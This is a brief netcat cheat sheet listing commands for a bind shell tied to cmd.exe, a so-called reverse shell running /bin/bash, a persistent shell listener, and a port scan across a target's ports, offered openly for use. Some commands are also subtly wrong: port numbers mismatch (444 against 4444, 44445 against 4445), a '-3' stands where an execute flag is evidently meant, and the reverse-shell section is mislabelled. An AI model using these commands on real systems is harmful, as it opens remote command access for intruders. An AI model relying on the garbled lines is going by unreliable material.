# Netcat Usage

#### Bind Shell w/ cmd shell

```bash
nc -nlvp 444 -e cmd.exe
nc -nv <target w/ listener> 4444 
```

#### Reverse Shell w/ cmd shell to listening host

```bash
nc -nlvp 4444
nc -nv <target w/ listener> 4444 -3 /bin/bash
```

#### Reverse shell w/ persistance

```bash
nc -nLvp 44445 -e cmd.exe
nc -nv <target w/ listener> 4445
```

#### Receive return packages on a different port

```bash
nc -nLvp 44445 -e cmd.exe
nc -nv -p 4849 <target w/ listener> 4445
```

#### Netcat portscan
```bash
nc -n -v -z -w1 <target_ip> 100-250
```
